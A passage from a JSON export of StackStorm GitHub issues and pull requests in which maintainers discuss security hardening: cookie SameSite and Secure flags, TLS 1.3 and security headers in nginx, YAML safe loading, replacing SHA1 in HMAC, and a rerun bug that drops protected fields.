                        "body": "I think it is on their master branch, so let's try targeting a git commit and avoid actually forking it.\n\nThey keep saying something about some CI infrastructure change, but they have not expounded. And there's no movement on releasing. So I don't see what else we can do.",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-09-14T21:57:09Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1247341814"
                    },
                    {
                        "body": "OK, we'll start without forking and see if we encounter other issues related to gunicron that require us to accumulate patches in a forked repo.",
                        "user": "nzlosh",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-15T08:09:56Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1247739291"
                    },
                    {
                        "body": "gunicorn 21 was released in July",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-09-03T17:37:30Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1704360394"
                    },
                    {
                        "body": "#6061 bumped eventlet to `0.33.3` - so I think this PR can be abandon as its been superseded now?",
                        "user": "jk464",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-11-27T12:02:01Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1827699883"
                    },
                    {
                        "body": "Thanks @jk464 for bumping this thread.\r\nClosing.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-27T12:29:32Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1827744294"
                    },
                    {
                        "body": "OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`.\n\nIf you change your mind, just re-open this PR and I'll resolve any conflicts on it.",
                        "user": "dependabot[bot]",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-11-27T12:29:35Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1827744371"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5257",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5248",
                "title": "Add support for setting SameSite and Secure attribute for auth cookie we set",
                "labels": [
                    "security",
                    "size/L",
                    "service: api"
                ],
                "user": "Kami",
                "issue_author_association": "MEMBER",
                "number": 5248,
                "id": 865534640,
                "state": "closed",
                "project_created_at": "2021-04-22T22:19:33Z",
                "closed_at": "2022-03-27T10:41:16Z",
                "body": "This pull request includes a small \"security hardening\" change.\r\n\r\nIt allows operator to configure value for ``SameSite`` attribute (https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite, https://web.dev/samesite-cookies-explained/) which is set with the ``auth-token`` cookie we set in some situations (e.g. when authenticating via st2web and similar).\r\n\r\nThe value defaults to ``Lax`` which should work as a good secure default (defining it to Strict may break some in some situations, see the link above).\r\n\r\n## TODO\r\n\r\n- [x] Unit tests\r\n- [x] Improve config option help string\r\n- [x] Upgrade notes entry - https://github.com/StackStorm/st2docs/pull/1070\r\n- [ ] Perhaps a st2docs page on various \"best security practices\" for deployments? (not necessary blocker for this PR)",
                "comments": [
                    {
                        "body": "I noticed we also don't set ``secure`` flag for the cookie.\r\n\r\nI will also add an option for that and default it to True since it's a best security practice.\r\n\r\nIn case someone doesn't run StackStorm over https (bad idea), they will need to set it to False. I will open st2docs upgrade notes entry which documents how to do that.\r\n\r\nAlso keep in mind that this cookie is pretty much only used when logging via token / api key in query parameters (which pretty much only means st2web for our official stuff).",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-04-23T12:38:49Z",
                        "url": "https://github.com/StackStorm/st2/pull/5248#issuecomment-825629488"
                    },
                    {
                        "body": "[![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/StackStorm/st2?pullRequest=5248) <br/>All committers have signed the CLA.",
                        "user": "CLAassistant",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-09-06T14:18:11Z",
                        "url": "https://github.com/StackStorm/st2/pull/5248#issuecomment-913685235"
                    },
                    {
                        "body": "@cognifloyd I pushed a change which renames ``None`` to ``unset`` (which I also think it's better).\r\n\r\nHopefully CI and tests will pass since my local dev environment is totally toast and I don't have multiple hours to spend to try to fix it at this point.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-11-11T12:45:50Z",
                        "url": "https://github.com/StackStorm/st2/pull/5248#issuecomment-966273764"
                    },
                    {
                        "body": "Now that v3.6.0 merge freeze is over, I will go ahead and merge it into master.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-27T10:41:04Z",
                        "url": "https://github.com/StackStorm/st2/pull/5248#issuecomment-1079902498"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5248",
                    "merged_at": "2022-03-27T10:41:16Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5216",
                "title": "Enable TLS v1.3 support in the default nginx config",
                "labels": [
                    "enhancement",
                    "security"
                ],
                "user": "Kami",
                "issue_author_association": "MEMBER",
                "number": 5216,
                "id": 848772157,
                "state": "closed",
                "project_created_at": "2021-04-01T20:36:47Z",
                "closed_at": "2021-06-11T19:53:28Z",
                "body": "We should update nginx config to support TLS v1.3 in addition to TLS v1.2.\r\n\r\nSince we still support Ubuntu 16.04, we can't do that easily for the installer (we could make it worth, but it's not the effort and complexity at this point), but we should at least do it for the docker setup (via nginx config patch) to begin with.\r\n\r\nThat image and nginx version should work just fine with TLS v1.3.",
                "comments": [
                    {
                        "body": "I believe the target is to deprecate Ubuntu 16.04 LTS after Adding Ubuntu 20.04 LTS.\r\nIf that happens in `v3.5.0`, the TLS change could be done directly in the [st2 nginx conf](https://github.com/StackStorm/st2/blob/master/conf/nginx/st2.conf).",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-04-01T20:43:41Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-812161293"
                    },
                    {
                        "body": "Yeah, that would be ideal. The less places and patches we need to maintain the better.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-04-02T16:30:15Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-812603895"
                    },
                    {
                        "body": "@amanda11 @armab @Kami So our agreed upon outcome is the st2.conf file that defaults to TLS 1.3, and a note in the docs that explains that one `can` change it back to TLS v1.2? ",
                        "user": "punkrokk",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-01T17:55:02Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852330328"
                    },
                    {
                        "body": "@punkrokk That's my understanding, but I've not been involved on the discussions prior to this.",
                        "user": "amanda11",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-06-01T18:50:56Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852364298"
                    },
                    {
                        "body": "Yeah, I'm :+1: to add TLS 1.3 as and addition or default in `nginx.conf`. As I understand @Kami was +1 too.\r\n\r\nWe know that U16 doesn't work with nginx & TLS1.3, but we're removing Xenial in this release.\r\n\r\nI don't know if we want to add\r\n```diff\r\n- ssl_protocols TLSv1.2;\r\n+ ssl_protocols TLSv1.2 TLSv1.3;\r\n```\r\n\r\nor maybe\r\n\r\n```diff\r\n- ssl_protocols TLSv1.2;\r\n+ ssl_protocols TLSv1.3;\r\n```\r\nand how it'll work in practice on other platforms across the OS fleet we support? Probably something to research.\r\n\r\n@punkrokk @Kami what are your thoughts?\r\ncc @StackStorm/maintainers @StackStorm/contributors",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-01T19:22:31Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852385462"
                    },
                    {
                        "body": "I thought @armab and I already discussed somewhere (can't find the PR atm) that sadly we can't do that yet since it's not just Xenial that doesn't support TLS v1.3 out of the box, but also Bionic and RHEL 7.\r\n\r\nI suggested only supporting TLS v1.3 on distros which support it (aka ship with OpenSSL 1.1.1), but that would increase the complexity and make troubleshooting harder.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-01T20:21:21Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852420277"
                    },
                    {
                        "body": "I think we could have the install script sed the file based on the distro. Eh? Shouldn’t cause any issues. Eg only update it on newer distros. \n\nJP Bourget / @punkrokk\n\n> On Jun 1, 2021, at 4:21 PM, Tomaz Muraus ***@***.***> wrote:\n> \n> ﻿\n> I thought @armab and I already discussed somewhere (can't find the PR atm) that sadly we can't do that yet since it's not just Xenial that doesn't support TLS v1.3 out of the box, but also Bionic and RHEL 7.\n> \n> I suggested only supporting TLS v1.3 on distros which support it (aka ship with OpenSSL 1.1.1), but that would increase the complexity and make troubleshooting harder,\n> \n> —\n> You are receiving this because you were mentioned.\n> Reply to this email directly, view it on GitHub, or unsubscribe.\n",
                        "user": "punkrokk",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-01T20:40:52Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852430969"
                    },
                    {
                        "body": "That's definitely possible, but it's a question of how we want to handle that. Installer script is just one of the \"consumers\" of that config file (other consumers include ansible playbook, chef, docker, etc.).\r\n\r\nI believe right now most of the installations methods just copy over that nginx.conf file without any modifications (IIRC, only outlier is docker stuff where we apply a patch which is already error prone and hard to maintainer).\r\n\r\nAnd even if we go with that route, the question is how to do it - default to TLS v1.2 and TLS v1.3 in the ngix.conf and then inside installer script remove TLS v1.3 if openssl 1.1.1 is not present or similar...",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-01T21:16:48Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852451577"
                    },
                    {
                        "body": "@armab What's your take on^?\r\n\r\nIIRC, you had the strongest opinion in the past about having multiple files / code paths in such scenarios (and IIRC, also @blag).",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T09:39:07Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852875423"
                    },
                    {
                        "body": "@Kami Thanks for more context! That's pretty critical information.\r\nI thought it just Ubuntu 16 in question. \r\nConsidering Ubuntu 18 and EL7 are also not TLS v1.3-compatible, I agree it doesn't worth the change.\r\n\r\nThe drift in the default installation environment would probably hit us back with different issues and community support. Something we tried to optimize before with an identical configuration across the OS fleet.\r\n\r\nSecurity-aware users can modify their configs, or service providers can recommend their clients to do the TLS 1.3 and more security hardening best practices that are not part of the default st2 config.\r\n\r\nIt might be even a good separation of the roles that comes naturally?\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T10:49:57Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852925352"
                    },
                    {
                        "body": "Does enabling TLSv1.3 support cause problems on EL7 / Ubuntu 18? Or will nginix just ignore the protocol it can't support?\r\n\r\nhttps://github.com/StackStorm/st2/blob/6e9306c2324ccb374a60e99da3b5e00c6f3c11da/conf/nginx/st2.conf#L39\r\n\r\n```diff\r\n- ssl_protocols             TLSv1.2; \r\n+ ssl_protocols             TLSv1.2 TLSv1.3; \r\n```\r\n\r\nedit: context - I just added TLSv1.3 on our EL7 host, and I don't see any errors.",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T14:24:20Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853072814"
                    },
                    {
                        "body": "Good point :+1: \r\n\r\nI think at this stage it would be nice to check all the OSes we support with a fresh install and if modified nginx config @cognifloyd mentioned works, any issues in the logs, what are the installed SSL versions in the system and how TLS version fall-back works in practice.\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T15:45:42Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853138563"
                    },
                    {
                        "body": "on my EL7 host, I have:\r\n- `nginx-1.19.10-1.el7.ngx.x86_64` from the [nginx mainline repo](http://nginx.org/en/linux_packages.html#RHEL-CentOS) (1.21.0 is available - I haven't updated).\r\n- `openssl-1.0.2k-21.el7_9.x86_64` from CentOS Updates repo (nginx rpm declares a dependency on this one)\r\n- `openssl11-1.1.1g-3.el7.x86_64` from EPEL 7 repo\r\n\r\nNo issues in any of the logs or the journal. It is serving the site just fine. And chrome says I'm connecting with TLSv1.2, which makes sense given the lack of TLSv1.3 support on EL7:\r\n<img width=\"457\" alt=\"Screen Shot 2021-06-02 at 11 42 59\" src=\"https://user-images.githubusercontent.com/1558590/120519007-cd7e0c00-c397-11eb-9df5-5c1446d990c7.png\">\r\n",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T16:44:27Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853189168"
                    },
                    {
                        "body": "That may work if we still want to support TLS v1.2 in addition to TLS v1.3, but need to double check since I thought it will error out if the openssl version against which nginx is linked doesn't support TLS v1.3 (but that may only be the case if we only specify TLS v1.3).\r\n\r\nAnother thing is cipher list - if we want to harden the deployment based on the available ciphers which depend on the OpenSSL version we will likely also need to have a special handling for that.\r\n\r\nWould also help if you can post the output against ``nginx -V``, in your case it maybe works because you installed openssl 1.1.1 from EPEL repo, but then again you said you are using nginx from the main line repo which likely isn't compiled against openssl 1.1.1.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T18:35:38Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853288177"
                    },
                    {
                        "body": "It's using `openssl 1.0.2k-fips`\r\n\r\n```\r\n$ nginx -V\r\nnginx version: nginx/1.19.10\r\nbuilt by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) \r\nbuilt with OpenSSL 1.0.2k-fips  26 Jan 2017\r\nTLS SNI support enabled\r\nconfigure arguments: --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib64/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/run/nginx.pid --lock-path=/var/run/nginx.lock --http-client-body-temp-path=/var/cache/nginx/client_temp --http-proxy-temp-path=/var/cache/nginx/proxy_temp --http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp --http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp --http-scgi-temp-path=/var/cache/nginx/scgi_temp --user=nginx --group=nginx --with-compat --with-file-aio --with-threads --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_mp4_module --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-mail --with-mail_ssl_module --with-stream --with-stream_realip_module --with-stream_ssl_module --with-stream_ssl_preread_module --with-cc-opt='-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -fPIC' --with-ld-opt='-Wl,-z,relro -Wl,-z,now -pie'\r\n```",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T19:25:48Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853324494"
                    },
                    {
                        "body": "OK, I confirmed it indeed works and falls back to a supported version and doesn't error on startup in case multiple versions are specific and some / one of them is not supported by nginx.\r\n\r\nThat's a good news since we can indeed just do ``ssl_protocols             TLSv1.2 TLSv1.3``.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T21:08:06Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853383594"
                    },
                    {
                        "body": "Meaning we can include that in v3.5.0.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-02T21:08:24Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-853383722"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5183",
                "title": "Added web security headers for nginx configuration",
                "labels": [
                    "enhancement",
                    "security",
                    "size/S"
                ],
                "user": "ashwini-orchestral",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5183,
                "id": 824548205,
                "state": "closed",
                "project_created_at": "2021-03-08T13:16:42Z",
                "closed_at": "2021-03-12T10:50:33Z",
                "body": "Added a few web security headers in the Nginx configuration.\r\nFor example - X-Frame-Options Header, Cache-control.\r\nDisable server version information.\r\n",
                "comments": [
                    {
                        "body": "On a somewhat related note:\r\n\r\n>   ssl_protocols             TLSv1 TLSv1.1 TLSv1.2;\r\n\r\nTLS v1.0 and v1.1 are also both past it's prime time now so it would probably be a good idea to just support TLS v1.2 going forward.\r\n\r\nI don't think it should negatively affect any installations (most everything supports TLS v1.2 these days), but we can document it in ugprade notes and on how to add support for TLS v1.1 back, if needed.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-03-10T16:45:38Z",
                        "url": "https://github.com/StackStorm/st2/pull/5183#issuecomment-795717387"
                    },
                    {
                        "body": "@Kami Good point.\r\n@nmaludy raised this before in [Proposal: Tighten up SSL protocols and ciphers in nginx config #44](https://github.com/StackStorm/discussions/issues/44) and feels it's a good time to do it?",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-03-10T16:58:34Z",
                        "url": "https://github.com/StackStorm/st2/pull/5183#issuecomment-795737807"
                    },
                    {
                        "body": "@armab Yeah, I think now is the right time.\r\n\r\nI will also open docs and upgrade notes entry with that in case it affects someone, but I think that would be quite unlikely.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-03-10T17:22:26Z",
                        "url": "https://github.com/StackStorm/st2/pull/5183#issuecomment-795773135"
                    },
                    {
                        "body": "Added web header settings for possible security issues, X-Frame-Options, Strict-Transport-Security, X-XSS-Protection and server-tokens.\r\nThanks,\r\nshital-orchestral",
                        "user": "shital-orchestral",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-03-11T13:07:10Z",
                        "url": "https://github.com/StackStorm/st2/pull/5183#issuecomment-796722506"
                    },
                    {
                        "body": "@ashwini-orchestral Can you add an entry in the CHANGELOG?",
                        "user": "m4dcoder",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-03-11T18:30:15Z",
                        "url": "https://github.com/StackStorm/st2/pull/5183#issuecomment-796950204"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5183",
                    "merged_at": "2021-03-12T10:50:32Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5162",
                "title": "Refactor spec_loader to use yaml.load with SafeLoader",
                "labels": [
                    "enhancement",
                    "security",
                    "size/S"
                ],
                "user": "ashwini-orchestral",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5162,
                "id": 813442995,
                "state": "closed",
                "project_created_at": "2021-02-22T12:10:02Z",
                "closed_at": "2021-03-11T21:09:06Z",
                "body": "It is not safe to call yaml.load with any data received from an untrusted source. It allows instantiation of arbitrary objects. The function yaml.safe_load limits this ability to simple Python objects like integers or lists. For security reasons, yaml.safe_load is used.",
                "comments": [
                    {
                        "body": "@m4dcoder Can you please add a small test case for it? Here is quick example of similar test case I added recently - https://github.com/StackStorm/st2/pull/4846/files#diff-4d4c6f566c2d72910eff03ac16f442387a53beb0aa7e9b0ad5944ec5ce602ab2R101.\r\n\r\nBesides that, LGTM.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-03-04T18:43:12Z",
                        "url": "https://github.com/StackStorm/st2/pull/5162#issuecomment-790841679"
                    },
                    {
                        "body": "We just reformatted the code with black. (Hooray!) And this PR got caught in the cross fire too. (Arrgh!)\r\nLuckily, merging master into this PR should not have many conflicts. Cheers!\r\n\r\nAlso, we need to look at performance when we switch out `yaml.load` for `yaml.safe_load`. @m4dcoder just added CSafeLoader to orquesta, and ended up needing to pass CSafeLoader into yaml.load to get both the performance boost and the safety. See: https://github.com/StackStorm/orquesta/pull/230/files#diff-c2248ccb7408cc089d472f1dcb72a531c386cac3a9af7ad7de9bebc1d5910f3c (and the discussion on that PR as well).",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-03-07T07:17:35Z",
                        "url": "https://github.com/StackStorm/st2/pull/5162#issuecomment-792230825"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5162",
                    "merged_at": "2021-03-11T21:09:06Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5161",
                "title": "Changes in the hash algorithm",
                "labels": [
                    "status:under discussion",
                    "security",
                    "database",
                    "size/L",
                    "migrations"
                ],
                "user": "ashwini-orchestral",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5161,
                "id": 813434372,
                "state": "open",
                "project_created_at": "2021-02-22T11:57:45Z",
                "closed_at": null,
                "body": "For security purposes, the hash function for symmetric encryption is changed ie. from SHA1 to SHA256. Also, a migration script is added to update the database with new encrypted values.",
                "comments": [
                    {
                        "body": "SHA-1 is not used in encryption, it is used in HMAC, which is, to my knowledge, still currently considered secure.\n\nhttps://crypto.stackexchange.com/questions/26510/why-is-hmac-sha1-still-considered-secure/26518#26518\n\nWe should walk, but not necessarily run, away from SHA1 as HMAC.",
                        "user": "blag",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-02-22T18:32:38Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-783581257"
                    },
                    {
                        "body": "Thanks for the contribution.\r\n\r\nAs @blag pointed out, SHA1 is used for MAC and not for actual symmetric encryption.\r\n\r\nIn theory, I'm fine with changing it, but in case we do decide to change the MAC algorithm we should re-evaluate if the current implementation (both for the MAC and actual symmetric encryption) is indeed (still recommended) and a safe choice - and if there are more things we should change, we should change those as well (but of course since it's a security sensitive code, we need to be careful). And if we do it, maybe we should just use sha512 to be future proof - that code is not used in that many places so I don't think it should add tons of overhead.\r\n\r\nWe used to use keyczar which is not supported anymore so we migrated the same code and algorithms to ``cryptography``. It's likely that there are safer and more robust defaults available these days.\r\n\r\nAs far as implementation and roll out goes - StackStorm is a distributed system which means we should approach all such changes in a specific manner to ensure a consistent roll out without issues (it basically means that the code needs to support both versions for a while aka until changes are rolled out to all the services and migration script finishes).\r\n\r\nWe don't have database object versioning in place and we also can't rely on a migration script by itself - the code needs to support both implementations - basically on read we need to support sha1 and sha256, but when the value is updated, we should write it out in a new format. This way we also don't need to add another database field.\r\n\r\nAnd if we want to make sure all the values are indeed migrated in a reasonable time frame, we should instruct users to run a migration script or perhaps go with the read-repair approach (on the read, if it still uses a new format, re-write the object with a new format - probably the migration script is better and easier to do).",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-02-22T20:13:06Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-783644217"
                    },
                    {
                        "body": "The comment about backward compatibility makes a lot of sense to me :+1: \r\nWe could also add a deprecation warning to logs in the case when an old key format is still used.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-02-22T20:27:42Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-783653130"
                    },
                    {
                        "body": "I think the discussion should be focus on whether the sha1 function use for hmac poses security risk or tainted image of st2 on a vulnerability scan.\r\n\r\nOn the lesser issue on migration, I need some explanation why users cannot run a migration script during st2 upgrade. User just run the script to re-encrypt KVP in the datastore and move on. We've asked users to run migration script before in prior releases. Why is this an issue now?\r\n",
                        "user": "m4dcoder",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-02-23T07:45:40Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-783980685"
                    },
                    {
                        "body": "There's better understanding on the issue here after some discussion. The data is still encrypted with AES-256 per docs at https://docs.stackstorm.com/datastore.html?highlight=encryption_key_path#securing-secrets-admin-only. The sha1 hash is used to generate the hmac hash to verify the encrypted text. So technically, this is low risk. However, per feedback, there could be collisions and change is still recommended because of the collision weaknesses.",
                        "user": "m4dcoder",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-02-24T01:24:32Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-784663470"
                    },
                    {
                        "body": "We just reformatted the code with black. (Hooray!) And this PR got caught in the cross fire too. (Arrgh!)\r\nLuckily, merging master into this PR should not have many conflicts. Cheers!",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-03-07T07:12:49Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-792230388"
                    },
                    {
                        "body": "[![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/StackStorm/st2?pullRequest=5161) <br/>All committers have signed the CLA.",
                        "user": "CLAassistant",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-09-06T14:18:21Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-913685358"
                    },
                    {
                        "body": "@ashwini-orchestral Can you:\r\n- add a changelog entry\r\n- could you address my other comments:\r\n  - move `crypto_key = AESKey.generate()` somewhere else so it's not regenerated for every key, and save it. We don't want to regenerate the all the values with a new key only to discard the key (which would prevent decrypting the newly re-encrypted values).\r\n  - drop `new_encrypted_value` from the model or explain why its needed.",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-04-01T19:06:38Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-1086237063"
                    },
                    {
                        "body": "I'm marking this as a draft until it the implementation is complete.",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-04-01T19:09:02Z",
                        "url": "https://github.com/StackStorm/st2/pull/5161#issuecomment-1086238942"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5161",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5151",
                "title": "Update cryptography to 3.3.2",
                "labels": [
                    "security",
                    "external dependency",
                    "size/S"
                ],
                "user": "blag",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5151,
                "id": 807571273,
                "state": "closed",
                "project_created_at": "2021-02-12T21:54:23Z",
                "closed_at": "2021-02-13T01:59:27Z",
                "body": "This PR updates cryptography to 3.3.2.\r\n\r\nCloses #5147, #5148,  #5149",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5151",
                    "merged_at": "2021-02-13T01:59:27Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5146",
                "title": "Workflow rerun doesn't inherit protected fields",
                "labels": [
                    "bug",
                    "security",
                    "component:st2web"
                ],
                "user": "minsis",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5146,
                "id": 804984176,
                "state": "open",
                "project_created_at": "2021-02-09T22:36:49Z",
                "closed_at": null,
                "body": "I dont know if I should list this a feature request or bug.\r\n\r\nWhen clicking rerun in the history on the UI you have to reenter any passwords or protected fields as they do not carry over from the parent run. Since passwords and such are saved, a rerun of the workflow should be able to inherit the protected fields as it does with the others.\r\n\r\n",
                "comments": [
                    {
                        "body": "Please use our issue format, just like you did in #5145.\r\n\r\nWe need to know:\r\n\r\n* StackStorm version (Paste the output of `st2 --version`)\r\n* Exact steps to reproduce the problem (eg: what happens if you click rerun, and then don't change any of the parameter fields and just click run?)\r\n* Expected results\r\n* Actual results\r\n* Any other useful information, like screenshots or exact error messages",
                        "user": "blag",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-02-09T22:45:04Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-776294875"
                    },
                    {
                        "body": "## SUMMARY\r\n\r\nWhen clicking rerun in the history on the UI you have to reenter any passwords or protected fields as they do not carry over from the parent run. Since passwords and such are saved, a rerun of the workflow should be able to inherit the protected fields as it does with the others.\r\n\r\n### STACKSTORM VERSION\r\n\r\nst2 3.3.0, on Python 3.6.9\r\n\r\n##### OS, environment, install method\r\n\r\nOracle 7 using st2-docker\r\n\r\n## Steps to reproduce the problem\r\n\r\nHere I'm just using core.remote but it could be happening with others.\r\n\r\n- Configured a rule to run a remote command: ```ls -l /``` on a 10m Interval trigger. Execution is successful\r\n![image](https://user-images.githubusercontent.com/11248197/107440617-7eb31a80-6af9-11eb-81ca-2cbb20d79908.png)\r\n\r\n- In history click on rerun which brings up the config window. Simply just click on run with the supposedly same configured parameters. This run will fail\r\n![image](https://user-images.githubusercontent.com/11248197/107441938-c5097900-6afb-11eb-8b42-68069a9e26f8.png)\r\n\r\n- Click on rerun again and replace the obfuscated password with the correct password and click run. This will be successful\r\n- I looked to see if I could reproduce this on the CLI but I didn't see a way to do a rerun of the action. My assumption is the UI resubmits the previous parameters back to the API.\r\n\r\n## Expected Results\r\n\r\nWhen clicking rerun on a failed action it should inherit all the parameters including obfuscated ones\r\n\r\n## Actual Results\r\n\r\nThe 2nd rerun of the failed (or any action) failed to run due to an authentication issue because the UI didn't provide the previous run's password.\r\n",
                        "user": "minsis",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-02-09T23:31:05Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-776315818"
                    },
                    {
